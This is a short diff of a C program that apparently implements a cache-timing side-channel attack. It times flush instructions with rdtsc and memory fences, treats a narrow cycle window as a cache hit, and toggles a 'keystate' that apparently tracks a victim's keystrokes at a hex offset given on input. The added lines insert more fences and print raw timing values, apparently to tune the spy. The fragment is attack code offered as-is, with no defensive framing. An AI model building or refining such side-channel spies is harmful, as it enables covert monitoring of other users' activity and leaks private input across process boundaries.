@@ -48,11 +48,21 @@ _mm_lfence();// fence the previous instruction
 
     size_t delta = __rdtsc() - time; //get time of flush instruction 
 
+_mm_lfence();// fence instruction
+
+    printf("RAW,%zu\n", delta); // pritn delta value
+    
+_mm_lfence(); // fence instruction
+
+
     if(delta >= 172 && delta <= 200){ 
 
         if (kpause > 1000){
 
             printf("cache Hit(%zu) after %10lu cycles, t=%10lu us\n", delta, kpause, (time-start)/2600);
+
+_mm_lfence();// fence printf instruction
+
             keystate = (keystate+1) % 2;
         }
         kpause = 0;
@@ -78,7 +88,7 @@ _mm_lfence();
     
     unsigned int offset = 0;
 
-    
+
     if (sscanf(offset_pointer, "%x", &offset) != 1) {
     printf("Invalid hexadecimal offset\n");
     return 1;
